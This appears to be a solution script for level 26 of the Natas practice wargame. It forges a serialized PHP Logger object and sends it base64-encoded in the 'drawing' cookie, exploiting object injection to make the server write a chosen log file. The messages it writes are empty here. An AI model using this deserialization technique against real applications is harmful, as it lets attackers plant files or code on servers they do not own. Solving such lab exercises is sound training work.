from natas import Natas
import base64

IMAGEPATH = 'natas26image.png'
PHPSESSID = 'asdf'

logfile = 'img/natas26_{PHPSESSID}.png'.format(PHPSESSID=PHPSESSID)
initmsg = ''
exitmsg = ''

fake_drawing = ''.join(('O:6:"Logger":3:{{s:13:"LoggerlogFile";s:{logfilelen}:"{logfile}"',
                ';s:13:"LoggerinitMsg";s:{initmsglen}:"{initmsg}"',
                ';s:13:"LoggerexitMsg";s:{exitmsglen}:"{exitmsg}";}}')).format(
                        logfilelen=len(logfile),
                        initmsglen=len(initmsg),
                        exitmsglen=len(exitmsg),
                        logfile=logfile,
                        initmsg=initmsg,
                        exitmsg=exitmsg
                        )

fake_drawing = base64.encodebytes(fake_drawing.encode('ascii')).decode('ascii').replace('\n', '')

natas = Natas('natas26', keep_session=True, quiet=True)

natas.set_cookie('PHPSESSID', PHPSESSID)
natas.set_cookie('drawing', fake_drawing)

resp = natas.get_response()

print(resp.text)
